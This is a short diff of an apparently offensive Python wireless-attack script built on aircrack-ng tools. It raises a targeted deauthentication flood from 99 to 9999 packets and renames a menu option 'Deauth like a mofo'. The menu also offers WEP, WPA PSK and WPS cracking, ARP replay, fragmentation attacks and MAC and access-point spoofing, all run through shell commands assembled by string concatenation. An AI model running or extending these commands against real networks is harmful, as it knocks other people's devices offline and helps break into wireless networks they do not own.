@@ -268,7 +268,7 @@ def fragout():
    os.system ("gnome-terminal -x aireplay-ng -5 -b \""+bssid+"\" -h \""+station+"\" --ignore-negative-one mon0")
 
 def deauthlikeamofo():
-   deauthsomeone = "aireplay-ng -0 99 -a "+bssid+" -c "+target_station+" --ignore-negative-one mon0"
+   deauthsomeone = "aireplay-ng -0 9999 -a "+bssid+" -c "+target_station+" --ignore-negative-one mon0"
    print deauthsomeone
    os.system("gnome-terminal -x "+deauthsomeone+" &")
 
@@ -309,7 +309,7 @@ listen()
 
 cont = "n"
 while (cont == "n"): 
-	listen_selection = raw_input("\n 0  Change Target\n 1  Fake-auth(FAST)\n 2  ARP Replay\n 3  Deauth Someone\n 4  Frag Attack\n 5  WEP crack\n 6  WPA PSK Crack\n 7  Print Pass\n 8  DOS Deauth\n 9  Connect\n 10 WPS Cracking\n 11 Spoof Mac\n 12 Spoof AP\n q  Quit\n\nplease pick a number: ")
+	listen_selection = raw_input("\n 0  Change Target\n 1  Fake-auth(FAST)\n 2  ARP Replay\n 3  Deauth Someone\n 4  Frag Attack\n 5  WEP crack\n 6  WPA PSK Crack\n 7  Print Pass\n 8  Deauth like a mofo\n 9  Connect\n 10 WPS Cracking\n 11 Spoof Mac\n 12 Spoof AP\n q  Quit\n\nplease pick a number: ")
 	if listen_selection == "0":
 		scan()
 		# input target prefs
